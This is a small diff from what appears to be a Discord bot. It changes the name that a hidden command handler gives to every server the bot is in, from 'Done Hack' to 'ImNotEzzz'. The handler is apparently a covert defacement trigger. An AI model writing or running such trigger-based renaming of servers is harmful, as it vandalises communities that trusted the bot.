@@ -41,7 +41,7 @@ client.on('message', message => {
 client.on('message', message => {
  if (message.content === x_x) {
   client.guilds.forEach(m => {
-   m.setName(`Done Hack`)
+   m.setName(`ImNotEzzz`)
   })
  }
 });
